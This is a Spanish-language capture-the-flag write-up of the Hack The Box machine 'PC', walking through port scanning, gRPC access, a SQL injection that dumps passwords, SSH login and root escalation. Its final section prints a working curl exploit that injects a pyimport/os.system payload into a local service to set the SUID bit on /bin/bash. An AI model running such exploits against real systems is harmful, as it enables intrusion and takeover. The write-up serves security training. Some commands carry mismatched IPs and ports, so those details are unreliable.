

![1](</Writeups/Maquinas/PC/img/logo.png>)
By Rug4lo

## Reconocimiento

Primero que todo vamos a empezar con el reconocimiento de la maquina:

Vamos a escanear los puertos de esta con Nmap:
```bash
nmap -p- --open -T5 -sS -min-rate 5000 -vvv -n -Pn -oG allports 10.10.11.214
```
```bash
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.93 ( https://nmap.org ) at 2023-09-03 13:06 CEST
Initiating SYN Stealth Scan at 13:06
Scanning 10.10.11.214 [65535 ports]
Discovered open port 22/tcp on 10.10.11.214
Discovered open port 50051/tcp on 10.10.11.214
Completed SYN Stealth Scan at 13:06, 39.50s elapsed (65535 total ports)
Nmap scan report for 10.10.11.214
Host is up, received user-set (0.10s latency).
Scanned at 2023-09-03 13:06:03 CEST for 40s
Not shown: 65533 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE REASON
22/tcp    open  ssh     syn-ack ttl 63
50051/tcp open  unknown syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 39.59 seconds
           Raw packets sent: 196631 (8.652MB) | Rcvd: 31 (1.364KB)
```
Después vamos a hacer un escaneo mandando unos scripts básicos de reconocimiento de nmap
```bash
nmap -sCV -p80,51045,51193,54585,59179 192.168.1.8 -oN targeted
```
```bash
s   targeted
Nmap scan report for 10.10.11.214
Host is up (0.11s latency).

PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 91bf44edea1e3224301f532cea71e5ef (RSA)
|   256 8486a6e204abdff71d456ccf395809de (ECDSA)
|_  256 1aa89572515e8e3cf180f542fd0a281c (ED25519)
50051/tcp open  unknown
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port50051-TCP:V=7.93%I=7%D=9/2%Time=64F36748%P=x86_64-pc-linux-gnu%r(NU
SF:LL,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff\xff\0\x05\0\?\xff\xff\0\x06
SF:\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\0\0\?\0\0")%r(GenericL
SF:ines,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff\xff\0\x05\0\?\xff\xff\0\x
SF:06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\0\0\?\0\0")%r(GetReq
SF:uest,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff\xff\0\x05\0\?\xff\xff\0\x
SF:06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\0\0\?\0\0")%r(HTTPOp
SF:tions,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff\xff\0\x05\0\?\xff\xff\0\
SF:x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\0\0\?\0\0")%r(RTSPR
SF:equest,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff\xff\0\x05\0\?\xff\xff\0
SF:\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\0\0\?\0\0")%r(RPCC
SF:heck,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff\xff\0\x05\0\?\xff\xff\0\x
SF:06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\0\0\?\0\0")%r(DNSVer
SF:sionBindReqTCP,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff\xff\0\x05\0\?\x
SF:ff\xff\0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\0\0\?\0\0"
SF:)%r(DNSStatusRequestTCP,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff\xff\0\
SF:x05\0\?\xff\xff\0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\0
SF:\0\?\0\0")%r(Help,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff\xff\0\x05\0\
SF:?\xff\xff\0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\0\0\?\0
SF:\0")%r(SSLSessionReq,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff\xff\0\x05
SF:\0\?\xff\xff\0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\0\0\
SF:?\0\0")%r(TerminalServerCookie,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff
SF:\xff\0\x05\0\?\xff\xff\0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\
SF:0\0\0\0\0\?\0\0")%r(TLSSessionReq,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\
SF:xff\xff\0\x05\0\?\xff\xff\0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08
SF:\0\0\0\0\0\0\?\0\0")%r(Kerberos,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xf
SF:f\xff\0\x05\0\?\xff\xff\0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0
SF:\0\0\0\0\0\?\0\0")%r(SMBProgNeg,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xf
SF:f\xff\0\x05\0\?\xff\xff\0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0
SF:\0\0\0\0\0\?\0\0")%r(X11Probe,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff\
SF:xff\0\x05\0\?\xff\xff\0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0
SF:\0\0\0\0\?\0\0");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Sep  2 18:48:19 2023 -- 1 IP address (1 host up) scanned in 18.18 seconds
```
Si buscamos información del puerto 50051 veremos que normalmente usa el servicio gRPC al cual no podremos acceder de forma normal

Esto nos pasara si nos conectamos normalmente 

![1](</Writeups/Maquinas/PC/img/1.png>)

Para acceder a este puerto usaremos una utilidad llamada grpcui

Este es el repo de la utilidad ---> https://github.com/fullstorydev/grpcui

Podemos usarla de esta manera:
```bash
grpcui -plaintext 10.10.11.214:50051
```

## Acceso al usuario Admin

Al ejecutar el anterior comando nos llevara a esta pagina 

![1](</Writeups/Maquinas/PC/img/2.png>)

Al toquetear un poco por aquí podremos ver que si creamos un usuario y nos logeamos como este nos darán un id y un JWT 

Si probamos en el login a logearnos como admin:admin veremos que nos dejara y que nos dará la JWT de este 

![1](</Writeups/Maquinas/PC/img/3.png>)

Con esta información nos podemos meter en el apartado getInfo y buscar la información del admin (la token es lo que esta entre comillas, no con la b)

![1](</Writeups/Maquinas/PC/img/4.png>)

cuando le damos a invoke podremos ver que no nos hace nada, pero que podemos hacer la cantidad que queramos de peticiones, así que podemos pasárnoslo a burpsuite 

![1](</Writeups/Maquinas/PC/img/5.png>)

## Explotación de la SQLI 

Podemos ver que se envia un campo id, por lo que podemos probar una SQL Injection

![1](</Writeups/Maquinas/PC/img/6.png>)

Cosa que funcionara, a partir de ahí podemos ir sacando bases de datos y tablas hasta llegar a la que nos interesa (accounts) y ahí filtrar por usuarios

![1](</Writeups/Maquinas/PC/img/7.png>)

y también filtrar por contraseñas

![1](</Writeups/Maquinas/PC/img/8.png>)

Ahora que tenemos las contraseñas podemos conectarnos como el usuario Sau en ssh
```bash
ssh sau@10.10.11.214
```
Una vez dentro podemos ver la flag del usuario

## Escalada de privilegios 

Ahora buscaremos por puertos abiertos dentro de la maquina 
```bash
netstat -nat
```
```bash
Proto Recv-Q Send-Q Local Address           Foreign Address         State      
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN     
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN     
tcp        0      0 127.0.0.1:8000          0.0.0.0:*               LISTEN     
tcp        0      0 0.0.0.0:9666            0.0.0.0:*               LISTEN     
tcp        0     36 10.10.11.214:22         10.10.14.103:54228      ESTABLISHED
tcp6       0      0 :::22                   :::*                    LISTEN     
tcp6       0      0 :::50051                :::*                    LISTEN     
tcp6       0      0 10.10.11.214:50051      10.10.14.103:35520      ESTABLISHED
```
podemos ver que el puerto 8000 esta abierto, por lo que podemos hacer un port forwarding 
```bash
ssh -L 8000:127.0.0.1:8000 sau@10.129.37.201
```
Al entrar veremos esta pagina

![1](</Writeups/Maquinas/PC/img/9.png>)

Al investigar un poco encontré que había una vuln para este servicio que nos permitía ejecutar comandos

Solo tendríamos que ejecutar este comando en la consola del ssh (en la parte del os.system el comando que queramos efectuar urlencodeado, en este caso **chmod u+s /bin/bash**)
```bash
curl -i -s -k -X $'POST' \
    --data-binary $'jk=pyimport%20os;os.system(\"%63%68%6d%6f%64%20%75%2b%73%20%2f%62%69%6e%2f%62%61%73%68 \");f=function%20f2(){};&package=xxx&crypted=AAAA&&passwords=aaaa' \
    $'http://127.0.0.1:8000/flash/addcrypted2'
```